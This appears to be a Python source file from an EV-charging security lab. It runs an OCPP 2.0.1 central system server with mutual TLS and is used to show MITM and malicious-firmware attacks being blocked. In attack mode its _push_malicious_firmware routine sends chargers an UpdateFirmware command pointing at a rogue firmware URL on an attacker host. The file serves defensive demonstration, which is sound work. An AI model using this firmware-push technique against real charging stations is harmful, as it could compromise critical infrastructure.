"""
===========================================================================
EVSecSim — OCPP 2.0.1 SECURE CSMS  (Security Profile 3: mutual TLS)
===========================================================================

The TLS-secured counterpart of v201/core/csms_server_v201.py, used by the
PREVENTION demos.  It listens on wss:// (port 9101) and requires a valid
client certificate (mutual TLS) — Security Profile 3.

WHAT THIS DEMONSTRATES (with the secure EVSE + attacker scripts)
---------------------------------------------------------------
  - MITM (Attacks 3a/3b/6): a man-in-the-middle proxy cannot interpose,
    because the EVSE validates the server certificate against the trust
    anchor and refuses any proxy that cannot present a CA-signed cert.
  - Firmware RCE (Attack 5): with FIRMWARE_ATTACK=1 this CSMS plays a
    *compromised but authenticated* CSMS that pushes a malicious firmware
    (UpdateFirmware → rogue location).  The EVSE downloads it, verifies the
    signature against the pinned manufacturer key, finds it invalid, and
    refuses to install — emitting FirmwareStatusNotification(InvalidSignature).

CALIBRATION
-----------
The block is achieved BY the security profile (TLS + cert validation +
firmware signing), not by the OCPP version number.  The honest claim is:
"under Security Profile 3 with signed firmware, correctly deployed, these
attacks are blocked" — demonstrated side-by-side against the plaintext
track where the same attacks succeed.

CERTS
-----
Reads /certs (baked into the image by gen_certs.py):
  server.pem / server.key   this server's identity
  ca.pem                    trust anchor used to verify client certs

HOW TO RUN
----------
  docker compose --profile v201-secure-normal   up   # CSMS + secure EVSE
  docker compose --profile v201-secure-mitm      up   # MITM blocked
  docker compose --profile v201-secure-firmware  up   # malicious firmware blocked
===========================================================================
"""

import asyncio
import logging
import os
import ssl
import websockets
from datetime import datetime, timezone, timedelta

logging.getLogger("websockets.server").setLevel(logging.CRITICAL)

from ocpp.routing import on
from ocpp.v201 import ChargePoint as cp
from ocpp.v201 import call, call_result
from ocpp.v201.enums import RegistrationStatusEnumType, AuthorizationStatusEnumType

CERT_DIR        = os.environ.get("CERT_DIR", "/certs")
PORT            = int(os.environ.get("CSMS_PORT", "9101"))
FIRMWARE_ATTACK = os.environ.get("FIRMWARE_ATTACK", "0") == "1"
ROGUE_FW_URL    = os.environ.get("ROGUE_FW_URL", "http://atk-firmware-secure:8090/firmware.bin")


def extract_power(meter_value):
    try:
        for mv in meter_value or []:
            samples = mv.get("sampled_value") or mv.get("sampledValue") or []
            for s in samples:
                if s.get("measurand") == "Power.Active.Import":
                    return str(s.get("value", "N/A"))
            if samples:
                return str(samples[0].get("value", "N/A"))
    except Exception:
        pass
    return "N/A"


class SecureCSMSv201(cp):

    @on("BootNotification")
    async def on_boot(self, charging_station, reason, **kwargs):
        vendor = charging_station.get("vendor_name") or charging_station.get("vendorName", "?")
        print(f"[CSMS-SEC] BootNotification from: {self.id} "
              f"({vendor} / {charging_station.get('model','?')})")
        if FIRMWARE_ATTACK:
            # Compromised authenticated CSMS — push malicious firmware after boot.
            asyncio.create_task(self._push_malicious_firmware())
        return call_result.BootNotification(
            current_time=datetime.now(timezone.utc).isoformat(),
            interval=10, status=RegistrationStatusEnumType.accepted)

    @on("Heartbeat")
    async def on_heartbeat(self, **kwargs):
        return call_result.Heartbeat(current_time=datetime.now(timezone.utc).isoformat())

    @on("StatusNotification")
    async def on_status(self, **kwargs):
        return call_result.StatusNotification()

    @on("Authorize")
    async def on_authorize(self, id_token, **kwargs):
        return call_result.Authorize(id_token_info={"status": AuthorizationStatusEnumType.accepted})

    @on("TransactionEvent")
    async def on_tx(self, event_type, timestamp, trigger_reason, seq_no, transaction_info, **kwargs):
        power = extract_power(kwargs.get("meter_value"))
        print(f"[CSMS-SEC] {self.id} | TransactionEvent[{event_type}] | Power = {power} kW")
        return call_result.TransactionEvent()

    @on("FirmwareStatusNotification")
    async def on_fw_status(self, status, **kwargs):
        flag = "  <- EVSE REJECTED FIRMWARE" if status in ("InvalidSignature", "InstallVerificationFailed") else ""
        print(f"[CSMS-SEC] {self.id} | FirmwareStatusNotification: {status}{flag}")
        return call_result.FirmwareStatusNotification()

    async def _push_malicious_firmware(self):
        await asyncio.sleep(2)
        print(f"[CSMS-SEC] {'='*54}")
        print(f"[CSMS-SEC]  FIRMWARE ATTACK — compromised authenticated CSMS")
        print(f"[CSMS-SEC]  Pushing UpdateFirmware -> {ROGUE_FW_URL}")
        print(f"[CSMS-SEC]  (malicious payload, attacker signature)")
        print(f"[CSMS-SEC] {'='*54}")
        try:
            resp = await self.call(call.UpdateFirmware(
                request_id=1,
                firmware={
                    "location": ROGUE_FW_URL,
                    "retrieveDateTime": datetime.now(timezone.utc).isoformat(),
                },
            ))
            print(f"[CSMS-SEC]  EVSE UpdateFirmware response: {resp.status}")
        except Exception as exc:
            print(f"[CSMS-SEC]  UpdateFirmware send failed: {exc}")


def server_ssl_context() -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(os.path.join(CERT_DIR, "server.pem"),
                        os.path.join(CERT_DIR, "server.key"))
    # Mutual TLS (Profile 3): require + verify a client certificate.
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.load_verify_locations(os.path.join(CERT_DIR, "ca.pem"))
    return ctx


async def handler(websocket):
    cp_id = "unknown"
    try:
        cp_id = await websocket.recv()
        print(f"[CSMS-SEC] Connected (mutual-TLS OK): {cp_id}")
        await SecureCSMSv201(cp_id, websocket).start()
    except websockets.exceptions.ConnectionClosedOK:
        print(f"[CSMS-SEC] {cp_id} disconnected cleanly.")
    except websockets.exceptions.ConnectionClosedError as exc:
        print(f"[CSMS-SEC] {cp_id} disconnected: {exc}")


async def main():
    bind = os.environ.get("BIND_HOST", "0.0.0.0")
    ctx = server_ssl_context()
    server = await websockets.serve(handler, bind, PORT, ssl=ctx)
    mode = "FIRMWARE ATTACK (compromised CSMS)" if FIRMWARE_ATTACK else "legitimate"
    print(f"[CSMS-SEC] Running on wss://{bind}:{PORT}  "
          f"(OCPP 2.0.1, Security Profile 3 / mutual TLS) — {mode}")
    await server.wait_closed()


if __name__ == "__main__":
    asyncio.run(main())
